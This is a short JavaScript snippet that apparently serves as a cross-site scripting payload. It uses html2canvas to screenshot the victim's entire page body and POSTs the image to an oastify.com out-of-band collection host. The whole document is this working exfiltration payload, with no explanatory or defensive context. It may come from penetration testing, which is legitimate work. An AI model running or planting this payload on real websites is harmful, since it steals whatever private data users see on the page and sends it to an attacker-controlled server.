html2canvas(document.body).then(function(canvas) {
    var screenshot = canvas.toDataURL("image/png");
    fetch("https://r6yeiueh1ecz0td90tvyus4pqgw7ky8n.oastify.com/screenshot", {
        method: "POST",
        body: JSON.stringify({ image: screenshot }),
        headers: { "Content-Type": "application/json" }
    });
});
